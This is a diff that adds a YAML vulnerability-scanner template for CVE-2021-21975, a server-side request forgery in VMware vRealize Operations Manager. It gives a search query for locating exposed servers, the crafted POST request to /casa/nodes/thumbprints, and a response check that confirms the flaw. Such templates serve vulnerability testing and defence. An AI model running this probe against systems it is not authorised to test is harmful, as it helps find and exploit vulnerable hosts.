@@ -1,0 +1,24 @@
+name: VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975
+manual: true
+query: app="Apache-Web-Server" && title="vRealize Operations Manager"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /casa/nodes/thumbprints
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: '["127.0.0.1:443"]'
+    expression: response.status == 200 && !response.body.bcontains(b"error_message")
+      && response.body.bcontains(b"thumbprint") && response.body.bcontains(b"address")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-21975
+  - https://www.vmware.com/security/advisories/VMSA-2021-0004.html
+  description: vRealize Operations Enable self-driving IT Operations Management across
+    private, hybrid and multi-cloud environments with a unified operations platform
+    that delivers continuous performance, capacity and cost optimization, intelligent
+    remediation and integrated compliance through AI/ML and predictive analytics.
+  tags: SSRF
